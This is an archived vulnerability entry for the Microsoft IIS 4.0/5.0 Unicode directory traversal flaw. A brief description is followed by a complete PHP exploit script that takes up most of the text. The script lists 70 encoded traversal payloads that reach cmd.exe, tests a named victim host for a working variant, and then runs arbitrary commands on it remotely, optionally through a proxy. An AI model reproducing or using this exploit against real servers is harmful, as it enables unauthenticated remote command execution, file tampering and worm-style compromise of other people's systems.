source: http://www.securityfocus.com/bid/1806/info
 
Microsoft IIS 4.0 and 5.0 are both vulnerable to double dot "../" directory traversal exploitation if extended UNICODE character representations are used in substitution for "/" and "\".
 
Unauthenticated users may access any known file in the context of the IUSR_machinename account. The IUSR_machinename account is a member of the Everyone and Users groups by default, therefore, any file on the same logical drive as any web-accessible file that is accessible to these groups can be deleted, modified, or executed. Successful exploitation would yield the same privileges as a user who could successfully log onto the system to a remote user possessing no credentials whatsoever.
 
It has been discovered that a Windows 98 host running Microsoft Personal Web Server is also subject to this vulnerability. (March 18, 2001)
 
This is the vulnerability exploited by the Code Blue Worm.
 
**UPDATE**: It is believed that an aggressive worm may be in the wild that actively exploits this vulnerability.

#!php -q
<?

$vector_ataque[0]="/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+";

$vector_ataque[1]="/msadc/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+";

$vector_ataque[2]="/msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";

$vector_ataque[3]="/msadc/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";

$vector_ataque[4]="/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+";

$vector_ataque[5]="/scripts/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+";

$vector_ataque[6]="/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+";

$vector_ataque[7]="/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+";

$vector_ataque[8]="/msadc/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+";

$vector_ataque[9]="/msadc/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+";

$vector_ataque[10]="/msadc/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+";

$vector_ataque[11]="/MSADC/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";

$vector_ataque[12]="/MSADC/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";

$vector_ataque[13]="/MSADC/..%%35%63..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";

$vector_ataque[14]="/MSADC/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";

$vector_ataque[15]="/_vti_bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+";

$vector_ataque[16]="/_vti_bin/..%%35c..%%35c..%%35c..%%35c..%%35c../winnt/system32/cmd.exe?/c+";

$vector_ataque[17]="/_vti_bin/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63../winnt/system32/cmd.exe?/c+";

$vector_ataque[18]="/_vti_bin/..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63../winnt/system32/cmd.exe?/c+";

$vector_ataque[19]="/PBServer/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";

$vector_ataque[20]="/PBServer/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";

$vector_ataque[21]="/PBServer/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";

$vector_ataque[22]="/PBServer/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";

$vector_ataque[23]="/Rpc/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";

$vector_ataque[24]="/Rpc/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";

$vector_ataque[25]="/Rpc/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";

$vector_ataque[26]="/Rpc/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";

$vector_ataque[27]="/_vti_bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+";

$vector_ataque[28]="/_vti_bin/..%%35c..%%35c..%%35c..%%35c..%%35c../winnt/system32/cmd.exe?/c+";

$vector_ataque[29]="/_vti_bin/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63../winnt/system32/cmd.exe?/c+";

$vector_ataque[30]="/_vti_bin/..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63../winnt/system32/cmd.exe?/c+";

$vector_ataque[31]="/samples/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";

$vector_ataque[32]="/cgi-bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";

$vector_ataque[33]="/iisadmpwd/..%252f..%252f..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+";

$vector_ataque[34]="/_vti_cnf/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";

$vector_ataque[35]="/adsamples/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";

$vector_ataque[36]="/scripts/..%C1%1C..%C1%1C..%C1%1C..%C1%1Cwinnt/system32/cmd.exe?/c+";

$vector_ataque[37]="/scripts/..%C1%9C..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c+";

$vector_ataque[38]="/scripts/..%C0%AF..%C0%AF..%C0%AF..%C0%AFwinnt/system32/cmd.exe?/c+";

$vector_ataque[39]="/scripts/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+";

$vector_ataque[40]="/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+";

$vector_ataque[41]="/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+";

$vector_ataque[42]="/scripts/..%c0%9v../winnt/system32/cmd.exe?/c+";

$vector_ataque[43]="/scripts/..%c0%af../winnt/system32/cmd.exe?/c+";

$vector_ataque[44]="/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+";

$vector_ataque[45]="/scripts/..%c1%8s../winnt/system32/cmd.exe?/c+";

$vector_ataque[46]="/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+";

$vector_ataque[47]="/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+";

$vector_ataque[48]="/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+";

$vector_ataque[49]="/_vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+";

$vector_ataque[50]="/scripts/..%c0%af../winnt/system32/cmd.exe?/c+";

$vector_ataque[51]="/scripts..%c1%9c../winnt/system32/cmd.exe?/c+";

$vector_ataque[52]="/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+";

$vector_ataque[53]="/scripts/..%c0%9v../winnt/system32/cmd.exe?/c+";

$vector_ataque[54]="/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+";

$vector_ataque[55]="/scripts/..%c1%8s../winnt/system32/cmd.exe?/c+";

$vector_ataque[56]="/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+";

$vector_ataque[57]="/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+";

$vector_ataque[58]="/scripts/..%c1%af../winnt/system32/cmd.exe?/c+";

$vector_ataque[59]="/scripts/..%e0%80%af../winnt/system32/cmd.exe?/c+";

$vector_ataque[60]="/scripts/..%f0%80%80%af../winnt/system32/cmd.exe?/c+";

$vector_ataque[61]="/scripts/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+";

$vector_ataque[62]="/scripts/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+";

$vector_ataque[63]="/msadc/..\%e0\%80\%af../..\%e0\%80\%af../..\%e0\%80\%af../winnt/system32/cmd.exe\?/c+";

$vector_ataque[64]="/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";

$vector_ataque[65]="/samples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";

$vector_ataque[66]="/iisadmpwd/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";

$vector_ataque[67]="/_vti_cnf/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";

$vector_ataque[68]="/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";

$vector_ataque[69]="/adsamples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";
        if(!isset($argv[1]))
        {
                echo

"\n\n--------------------------------------------------------------------\n";
                echo "------------- (c) UNICODE exploit for IIS 5.0/4.0 by BoloTron
------\n";
                echo
"--------------------------------------------------------------------\n\n";
                echo "Usage of the wicked device:\n";
                echo $argv[0]." -t www.victim.vic\n";
                echo $argv[0]." -t www.victim.vic -p proxy:port\n";
                echo $argv[0]."  www.victim.vic comand variant_number\n";
                echo $argv[0]." -p proxy:port www.victim.vic comand variant_number\n";
                echo "Options:\n";
                echo "-t --> Test the vulnerability (Try known variants till find the good
one)\n";
                echo "-p --> Attack through proxy\n";
                echo "\nUse Mode:\n1) Test the host and get the variants number in case
vulnerability exists\n";
                echo "2) Attack with command and variants number (optionaly you can use
proxy)\n";
                echo "Note : When you specify a command with spaces, replace spaces
with low script  \"_\" \n";
                echo "and you must double the backslash \"\\\". \n
Example".$argv[0]." -p proxy.prx:3128 www.victima.com dir_c:\\\\inetpub 49\n";
                echo "Thanks to An-tonio for the proxy support.\n";
                echo "Bug discover by Anonymous Post.\n";
                echo "TYPE ".$argv[0]." spanish, for Spanish help.\n";
        }
        else
        {
                if($argv[1]=="spanish")
                {
                echo
"\n\n--------------------------------------------------------------------\n";
                echo "------------- (c) Exploit UNICODE para IIS 5.0/4.0 por
BoloTron ----\n";
                echo
"--------------------------------------------------------------------\n\n";
                echo "Uso del artefacto maligno :\n";

                echo $argv[0]." -t www.victima.vic\n";
                echo $argv[0]." -t www.victima.vic -p proxy:puerto\n";
                echo $argv[0]."  www.victima.vic comando n?_de_variante\n";
                echo $argv[0]." -p proxy:port www.victima.vic comand
n?_de_variante\n";
                echo "Opciones:\n";
                echo "-t --> Testea la vulnerabilidad, prueba todas las
variantes hasta encontrar una buena.\n";
                echo "-p --> Ataque a traves de proxy\n";
                echo "\nModo de Empleo:\n1) Testear el host y anotar el
numero de variante en caso de ser vulnerable\n";
                echo "2) Atacar especificando comando y n? de variante
(opcionalmente puedes especificar un proxy)\n";
                echo "Nota : Cuando se especifica un comando en el que hay
espacios hay que sustituirlos por un guion bajo _ \n";
                echo "y las contrabarras hay que ponerlas dobles. \nEjemplo :
".$argv[0]." -p proxy.prx:3128 www.victima.com dir_c:\\\\inetpub 49\n";
                echo "Gracias a An-tonio por sus indicaciones en el soporte proxy.\n";
                echo "Bug descubierto por aviso anonimo.\n";
                exit;
                }
                if($argv[1]=="-t")
                {
                        if ($argv[3]=="-p")
                        {
                        for($i=0;$i<70;$i++)
                        {
                                $prox=explode(":",$argv[4]);
                                $comando="dir+c:\\";
                                $fp = fsockopen($prox[0], $prox[1]);
                                if(!$fp)
                                {
                                        echo "Conection failed...\n";
                                }
                                else
                                {
                                        fputs($fp,"GET
http://".$argv[2]."".$vector_ataque[$i]."".$comando." HTTP/1.0\n\n");
                                        echo "Trying variant number ".$i." ";
                                        while(!feof($fp))
                                        {
                                                $resul=$resul.fgets($fp,128);
                                        }
                                        if (ereg("<DIR>", $resul))
                                        {
                                                echo "-----> Vulnerable!!\n";
                                                exit;
                                        }
                                        else
                                        {
                                                echo "-----> NoT Vulnerable
:(\n";
                                        }

                                }
                                fclose($fp);
                        }
                        }
                        else
                        {
                        for($i=0;$i<70;$i++)
                        {
                                $port=80;
                                $comando="dir+c:\\";
                                $fp = fsockopen($argv[2], $port);
                                if(!$fp)
                                {
                                        echo "Conection failed...\n";
                                }
                                else
                                {
                                        fputs($fp,"GET
".$vector_ataque[$i]."".$comando." HTTP/1.0\n\n");
                                        echo "Trying variant number ".$i." ";
                                        while(!feof($fp))
                                        {
                                                $resul=$resul.fgets($fp,128);
                                        }
                                        if (ereg("<DIR>", $resul))
                                        {
                                                echo "-----> vulnerable!!\n";
                                                exit;
                                        }
                                        else
                                        {
                                                echo "-----> No Vulnerable :(\n";
                                        }

                                }
                                fclose($fp);
                        }
                        }
                }
                else
                {
                        if($argv[1]=="-p")
                        {
                                $prox=explode(":",$argv[2]);
                                $port=$prox[1];
                                $comando=ereg_replace("_","+",$argv[4]);
                                $fp = fsockopen($prox[0], $port);

                                if(!$fp)
                                {
                                        echo "Conection failed.\n";
                                }
                                else
                                {
                                        fputs($fp,"GET
http://".$argv[3]."".$vector_ataque[$argv[5]]."".$comando." HTTP/1.0\n\n");
                                        while(!feof($fp))
                                        {
                                                echo fgets($fp,128);
                                        }
                                }
                                fclose($fp);

                        }
                        else
                        {
                                $port=80;
                                $comando=ereg_replace("_","+",$argv[2]);
                                $fp = fsockopen($argv[1], $port);
                                if(!$fp)
                                {
                                        echo "Conection failed.\n";
                                }
                                else
                                {
                                        fputs($fp,"GET ".$vector_ataque[$argv[3]]."".$comando." HTTP/1.0\n\n");
                                        while(!feof($fp))
                                        {
                                                echo fgets($fp,128);
                                        }
                                }
                                fclose($fp);
                        }
                }




        }
?>